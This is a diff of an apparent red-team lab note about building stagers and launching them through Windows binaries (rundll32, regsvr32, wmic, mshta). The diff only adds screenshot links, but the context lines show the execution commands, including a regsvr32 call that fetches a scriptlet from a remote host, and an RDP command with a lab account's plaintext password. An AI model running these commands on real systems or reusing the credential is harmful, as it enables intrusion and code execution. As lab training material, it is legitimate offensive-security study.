@@ -14,6 +14,8 @@ This lab will focus on creating multiple payloads and then testing them in the s
 
 #### *Payload:* Create Powershell Stager
 
+![[Pasted image 20240317180009.png]]
+
 #### *Execution Technique:* 
 ```markdown
 # Executing Stager with rundll32.exe
@@ -26,6 +28,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 #### *Payload:* Create a SCT stager
 `xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp`
 
+![[Pasted image 20240317175954.png]]
 #### *Execution Technique:* 
 ```markdown
 # Executing Stager with regsvr32.exe
@@ -36,6 +39,8 @@ regsvr32 /s /n /u /i:http://10.254.252.3:8000/config.sct scrobj.dll
 ## [[WMIC stager and execute with wmic]]
 
 #### *Payload:* Create WMIC Stager
+
+![[Pasted image 20240317175936.png]]
 
 #### *Execution Technique:* 
 ```markdown
@@ -50,6 +55,7 @@ wmic os get /format:"update.xsl"
 
 #### *Payload:* Create HTA Stager
 
+![[Pasted image 20240317175917.png]]
 #### *Execution Technique:* 
 ```markdown
 # Executing Stager with mshta.exe
